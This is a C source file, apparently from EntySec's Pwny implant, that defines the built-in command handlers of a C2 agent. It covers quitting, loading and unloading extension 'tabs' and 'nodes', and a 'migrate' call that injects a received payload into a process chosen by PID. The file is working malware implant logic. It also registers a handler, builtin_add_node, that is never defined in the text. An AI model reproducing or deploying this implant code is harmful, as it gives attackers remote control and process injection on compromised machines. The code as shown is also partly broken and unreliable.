/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <api.h>
#include <c2.h>
#include <node.h>
#include <tab.h>
#include <migrate.h>
#include <tlv_types.h>
#include <tlv.h>

#define BUILTIN_TAG TLV_TYPE_TAG | 4001

static tlv_pkt_t *builtin_quit(c2_t *c2)
{
    return api_craft_tlv_pkt(API_CALL_QUIT);
}

static tlv_pkt_t *builtin_delete_node(c2_t *c2)
{
    int node_id;
    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_NODE_ID, &node_id);

    if (node_delete(&c2->dynamic.nodes, node_id) == 0)
        return api_craft_tlv_pkt(API_CALL_SUCCESS);

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_add_tab(c2_t *c2)
{
    int tab_size;
    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_TAB_SIZE, &tab_size);

    unsigned char *tab = malloc(tab_size);

    if (tab != NULL)
    {
        if (tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_TAB, tab) == 0)
        {
            if (tab_add(&c2->dynamic.tabs, c2->dynamic.t_count, tab) == 0)
            {
                tlv_pkt_t *result = api_craft_tlv_pkt(API_CALL_SUCCESS);
                tlv_pkt_add_int(result, TLV_TYPE_TAB_ID, c2->dynamic.t_count);
                c2->dynamic.t_count += 1;
                return result;
            }
        }
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_delete_tab(c2_t *c2)
{
    int tab_id;
    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_TAB_ID, &tab_id);

    if (tab_delete(&c2->dynamic.tabs, tab_id) == 0)
        return api_craft_tlv_pkt(API_CALL_SUCCESS);

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_migrate(c2_t *c2)
{
    int migrate_size;
    pid_t migrate_pid;

    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_MIGRATE_SIZE, &migrate_size);
    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_MIGRATE_PID, &migrate_pid);

    unsigned char *migrate = malloc(migrate_size);

    if (migrate != NULL)
    {
        if (tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_MIGRATE, migrate) == 0)
        {
            if (migrate_init(c2, migrate_pid, migrate_size, migrate) == 0)
            {
                free(migrate);
                return api_craft_tlv_pkt(API_CALL_QUIT);
            }
        }

        free(migrate);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *builtin_test(c2_t *c2)
{
    tlv_pkt_t *result = api_craft_tlv_pkt(API_CALL_SUCCESS);
    tlv_pkt_add_string(result, TLV_TYPE_STRING, "Test");
    return result;
}

void register_builtin_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, BUILTIN_TAG | 1, builtin_quit);
    api_call_register(api_calls, BUILTIN_TAG | 2, builtin_add_node);
    api_call_register(api_calls, BUILTIN_TAG | 3, builtin_delete_node);
    api_call_register(api_calls, BUILTIN_TAG | 4, builtin_add_tab);
    api_call_register(api_calls, BUILTIN_TAG | 5, builtin_delete_tab);
    api_call_register(api_calls, BUILTIN_TAG | 6, builtin_migrate);
    api_call_register(api_calls, BUILTIN_TAG | 7, builtin_test);
}